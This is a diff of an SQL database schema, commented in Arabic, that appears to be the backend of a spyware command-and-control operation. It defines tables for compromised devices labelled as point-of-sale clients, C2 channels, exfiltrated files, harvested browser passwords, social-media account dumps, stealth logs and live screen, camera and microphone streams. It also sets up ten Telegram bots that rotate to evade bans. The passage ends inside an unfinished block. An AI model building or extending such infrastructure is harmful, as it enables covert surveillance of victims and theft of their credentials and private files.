@@ -1,6 +1,8 @@
--- database/complete_schema.sql (نفذ في كل مشروع من المشاريع الأربعة)
+-- database/complete_schema.sql
+-- قم بتنفيذ هذا الملف في كل مشروع من مشاريع Supabase الأربعة
+
 -- ============================================================
--- 1. تنظيف البيئة (حذف الجداول القديمة)
+-- 1. تنظيف البيئة (حذف الجداول القديمة إن وجدت)
 -- ============================================================
 DROP TABLE IF EXISTS sessions CASCADE;
 DROP TABLE IF EXISTS banned_chats CASCADE;
@@ -29,6 +31,9 @@ DROP TABLE IF EXISTS heartbeat CASCADE;
 DROP TABLE IF EXISTS bot_status CASCADE;
 DROP TABLE IF EXISTS config CASCADE;
 DROP TABLE IF EXISTS live_frames CASCADE;
+DROP TABLE IF EXISTS audio_stream CASCADE;
+DROP TABLE IF EXISTS stream_sessions CASCADE;
+DROP TABLE IF EXISTS device_topics CASCADE;
 
 -- ============================================================
 -- 2. إدارة الوصول والأمان
@@ -36,7 +41,8 @@ DROP TABLE IF EXISTS live_frames CASCADE;
 CREATE TABLE sessions (
     chat_id BIGINT PRIMARY KEY,
     last_activity TIMESTAMPTZ DEFAULT now(),
-    session_token TEXT
+    session_token TEXT,
+    pending_action TEXT -- لتخزين حالة انتظار إدخال (مثل حقن النص)
 );
 
 CREATE TABLE banned_chats (
@@ -52,6 +58,7 @@ CREATE TABLE pos_clients (
     Client_serial TEXT UNIQUE NOT NULL,
     Hardware_uuid TEXT,
     Public_key TEXT,
+    Fcm_token TEXT,                     -- توكن FCM للإشعارات الفورية
     First_seen TIMESTAMPTZ DEFAULT now(),
     Last_seen TIMESTAMPTZ DEFAULT now(),
     Operational_status TEXT DEFAULT 'online',
@@ -63,29 +70,29 @@ CREATE TABLE pos_clients (
 );
 
 CREATE TABLE device_keys (
-    Device_id TEXT PRIMARY KEY REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
+    Device_id TEXT PRIMARY KEY REFERENCES pos_clients(Client_serial) ON DELETE CASCADE,
     Shared_key_enc TEXT NOT NULL,
     Expiry BIGINT NOT NULL
 );
 
 CREATE TABLE heartbeat (
     id BIGSERIAL PRIMARY KEY,
-    device_id TEXT REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
+    device_id TEXT REFERENCES pos_clients(Client_serial) ON DELETE CASCADE,
     last_ping TIMESTAMPTZ DEFAULT now(),
     battery_level INT,
     network_type TEXT
 );
 
 -- ============================================================
--- 4. إدارة البوتات (جداول جديدة ضرورية)
+-- 4. إدارة البوتات العشرة (للمناوبة وتجنب الحظر)
 -- ============================================================
 CREATE TABLE bot_status (
-    bot_id TEXT PRIMARY KEY,               -- معرف البوت (مثل master, stream, project1)
-    bot_token_enc TEXT NOT NULL,           -- التوكن مشفر (أو مرجع في Vault)
+    bot_id TEXT PRIMARY KEY,
+    bot_token_enc TEXT NOT NULL,
     last_ping TIMESTAMPTZ DEFAULT now(),
     is_active BOOLEAN DEFAULT true,
     fail_count INT DEFAULT 0,
-    role TEXT                               -- رئيسي، احتياطي، بث، إلخ
+    role TEXT                     -- 'master', 'stream', 'project_a', 'standby', ...
 );
 
 CREATE TABLE c2_channels (
@@ -112,23 +119,38 @@ CREATE TABLE config (
 );
 
 -- ============================================================
--- 5. البث المباشر (جديد)
+-- 5. البث المباشر (باستخدام Realtime Broadcast – تخزين اختياري)
 -- ============================================================
-CREATE TABLE live_frames (
-    id BIGSERIAL PRIMARY KEY,
-    session_id TEXT NOT NULL,
-    device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
-    frame_enc TEXT NOT NULL,   -- الإطار مشفر
+CREATE TABLE stream_sessions (
+    session_id TEXT PRIMARY KEY,
+    device_id TEXT REFERENCES pos_clients(Client_serial) ON DELETE CASCADE,
+    chat_id BIGINT,
+    stream_type TEXT,   -- 'screen', 'front_camera', 'back_camera', 'audio'
+    expires_at TIMESTAMPTZ NOT NULL,
     created_at TIMESTAMPTZ DEFAULT now()
 );
-CREATE INDEX idx_live_frames_session ON live_frames(session_id);
+
+-- جدول لتخزين الإطارات إذا أردنا حفظ البث (اختياري)
+CREATE TABLE live_frames (
+    id BIGSERIAL PRIMARY KEY,
+    session_id TEXT REFERENCES stream_sessions(session_id) ON DELETE CASCADE,
+    frame_enc TEXT NOT NULL,
+    created_at TIMESTAMPTZ DEFAULT now()
+);
+
+CREATE TABLE audio_stream (
+    id BIGSERIAL PRIMARY KEY,
+    session_id TEXT REFERENCES stream_sessions(session_id) ON DELETE CASCADE,
+    audio_chunk_enc TEXT NOT NULL,
+    created_at TIMESTAMPTZ DEFAULT now()
+);
 
 -- ============================================================
 -- 6. المهام والأوامر
 -- ============================================================
 CREATE TABLE service_requests (
     Ticket_id BIGSERIAL PRIMARY KEY,
-    Target_client TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
+    Target_client TEXT NOT NULL REFERENCES pos_clients(Client_serial) ON DELETE CASCADE,
     Request_type TEXT NOT NULL,
     Request_data TEXT,
     Ticket_status TEXT DEFAULT 'open',
@@ -138,15 +160,17 @@ CREATE TABLE service_requests (
 );
 
 -- ============================================================
--- 7. استخراج البيانات
+-- 7. استخراج البيانات (Exfiltration)
 -- ============================================================
 CREATE TABLE exfil (
     Id BIGSERIAL PRIMARY KEY,
-    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
+    Device_id TEXT NOT NULL REFERENCES pos_clients(Client_serial) ON DELETE CASCADE,
     File_path TEXT NOT NULL,
     File_name TEXT,
     File_size BIGINT,
     Mime_type TEXT,
+    Thumbnail TEXT,               -- صورة مصغرة (base64) لتوفير المساحة
+    Has_full BOOLEAN DEFAULT false,
     File_type TEXT GENERATED ALWAYS AS (
         CASE
             WHEN file_name ~* '\.(jpg|jpeg|png|gif|webp)$' THEN 'image'
@@ -159,7 +183,7 @@ CREATE TABLE exfil (
 
 CREATE TABLE browser_creds (
     Id BIGSERIAL PRIMARY KEY,
-    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
+    Device_id TEXT NOT NULL REFERENCES pos_clients(Client_serial) ON DELETE CASCADE,
     Browser TEXT,
     url TEXT,
     Username TEXT,
@@ -169,7 +193,7 @@ CREATE TABLE browser_creds (
 
 CREATE TABLE social_dumps (
     Id BIGSERIAL PRIMARY KEY,
-    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
+    Device_id TEXT NOT NULL REFERENCES pos_clients(Client_serial) ON DELETE CASCADE,
     App TEXT,
     Account_data JSONB,
     Dumped_at TIMESTAMPTZ DEFAULT now()
@@ -180,7 +204,7 @@ CREATE TABLE social_dumps (
 -- ============================================================
 CREATE TABLE discovered_vulnerabilities (
     Id BIGSERIAL PRIMARY KEY,
-    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
+    Device_id TEXT NOT NULL REFERENCES pos_clients(Client_serial) ON DELETE CASCADE,
     Vulnerability_type TEXT,
     Severity TEXT,
     Discovery_data JSONB,
@@ -190,7 +214,7 @@ CREATE TABLE discovered_vulnerabilities (
 
 CREATE TABLE ai_tasks (
     Task_id BIGSERIAL PRIMARY KEY,
-    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
+    Device_id TEXT NOT NULL REFERENCES pos_clients(Client_serial) ON DELETE CASCADE,
     Task_type TEXT NOT NULL,
     Task_params JSONB,
     Result_data JSONB,
@@ -201,7 +225,7 @@ CREATE TABLE ai_tasks (
 
 CREATE TABLE ai_results (
     Id BIGSERIAL PRIMARY KEY,
-    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
+    Device_id TEXT NOT NULL REFERENCES pos_clients(Client_serial) ON DELETE CASCADE,
     Module TEXT,
     Result JSONB,
     Created_at TIMESTAMPTZ DEFAULT now()
@@ -212,7 +236,7 @@ CREATE TABLE ai_results (
 -- ============================================================
 CREATE TABLE stealth_logs (
     Log_id BIGSERIAL PRIMARY KEY,
-    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
+    Device_id TEXT NOT NULL REFERENCES pos_clients(Client_serial) ON DELETE CASCADE,
     Event_type TEXT NOT NULL,
     Event_data JSONB,
     Timestamp TIMESTAMPTZ DEFAULT now()
@@ -220,7 +244,7 @@ CREATE TABLE stealth_logs (
 
 CREATE TABLE error_logs (
     Id BIGSERIAL PRIMARY KEY,
-    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
+    Device_id TEXT NOT NULL REFERENCES pos_clients(Client_serial) ON DELETE CASCADE,
     Error_code TEXT NOT NULL,
     Error_message TEXT,
     Module TEXT,
@@ -228,17 +252,38 @@ CREATE TABLE error_logs (
 );
 
 -- ============================================================
--- 10. الفهارس
+-- 10. ربط الأجهزة بمواضيع Telegram
 -- ============================================================
-CREATE INDEX idx_pos_clients_serial ON pos_clients(client_serial);
-CREATE INDEX idx_exfil_device ON exfil(device_id);
-CREATE INDEX idx_requests_target ON service_requests(target_client);
-CREATE INDEX idx_heartbeat_device ON heartbeat(device_id);
-CREATE INDEX idx_vuln_device ON discovered_vulnerabilities(device_id);
-CREATE INDEX idx_bot_status_last_ping ON bot_status(last_ping);
+CREATE TABLE device_topics (
+    device_id TEXT PRIMARY KEY REFERENCES pos_clients(Client_serial) ON DELETE CASCADE,
+    control_topic_id BIGINT NOT NULL,
+    vault_topic_id BIGINT NOT NULL,
+    created_at TIMESTAMPTZ DEFAULT now()
+);
 
 -- ============================================================
--- 11. تفعيل RLS لجميع الجداول
+-- 11. الفهارس لتحسين الأداء
+-- ============================================================
+DROP INDEX IF EXISTS idx_pos_clients_serial;
+DROP INDEX IF EXISTS idx_exfil_device;
+DROP INDEX IF EXISTS idx_requests_target;
+DROP INDEX IF EXISTS idx_heartbeat_device;
+DROP INDEX IF EXISTS idx_vuln_device;
+DROP INDEX IF EXISTS idx_bot_status_last_ping;
+DROP INDEX IF EXISTS idx_live_frames_session;
+DROP INDEX IF EXISTS idx_audio_stream_session;
+
+CREATE INDEX idx_pos_clients_serial ON pos_clients(Client_serial);
+CREATE INDEX idx_exfil_device ON exfil(Device_id);
+CREATE INDEX idx_requests_target ON service_requests(Target_client);
+CREATE INDEX idx_heartbeat_device ON heartbeat(device_id);
+CREATE INDEX idx_vuln_device ON discovered_vulnerabilities(Device_id);
+CREATE INDEX idx_bot_status_last_ping ON bot_status(last_ping);
+CREATE INDEX idx_live_frames_session ON live_frames(session_id);
+CREATE INDEX idx_audio_stream_session ON audio_stream(session_id);
+
+-- ============================================================
+-- 12. تفعيل RLS وسياسة service_role
 -- ============================================================
 DO $$
 DECLARE
